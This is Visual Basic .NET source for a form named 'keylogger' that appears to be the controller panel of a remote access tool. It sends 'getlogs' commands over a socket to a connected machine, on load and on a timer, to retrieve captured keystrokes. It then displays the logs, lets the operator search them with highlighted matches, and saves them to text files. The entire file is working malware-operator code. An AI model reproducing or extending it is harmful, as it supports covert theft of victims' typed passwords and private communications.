Public Class keylogger
    Public sock As Integer

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        Main.S.Send(sock, "getlogs")
    End Sub

    Private Sub SaveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Dim x As New SaveFileDialog
        With x
            .Filter = "TXT|*.txt"

        End With

        If x.ShowDialog = Windows.Forms.DialogResult.OK Then
            FileOpen(1, x.FileName, OpenMode.Binary)
            FilePut(1, TextBox1.Text)
            FileClose(1)
            MsgBox("Logs Saved", MsgBoxStyle.Information, "")
        End If


    End Sub
    Private Sub keylogger_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        SkyDarkButton2.Enabled = False
        Main.S.Send(sock, "getlogs")
        Main.S.Send(sock, "getlog")
    End Sub
    Private Sub Search()
        If TextBox1.Text.Contains(TextBox2.Text) = True Then
            Dim x As Integer = TextBox1.Text.IndexOf(TextBox2.Text, TextBox1.Text.IndexOf(TextBox2.Text))
            Dim y As Integer = TextBox2.Text.Length
            TextBox1.Select(x, y)
            TextBox1.SelectionColor = Color.Red
            TextBox1.SelectionFont = New Font(TextBox1.Font, FontStyle.Bold)
        Else
            MsgBox("Cannot Find This Word : " & " " & TextBox2.Text)
            TextBox2.Text = ""

        End If
    End Sub

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        Search()
    End Sub

    Private Sub TabPage2_Click(sender As System.Object, e As System.EventArgs) Handles TabPage2.Click

    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Main.S.Send(sock, "getlogs")
    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        Timer1.Stop()
        SkyDarkButton2.Enabled = False
    End Sub

    Private Sub onlinetext_MouseHover(sender As System.Object, e As System.EventArgs) Handles onlinetext.MouseHover
        If SkyDarkButton2.Enabled = False Then
            SkyDarkButton2.Enabled = True
            Timer1.Start()
        Else
            Exit Sub
        End If
    End Sub
End Class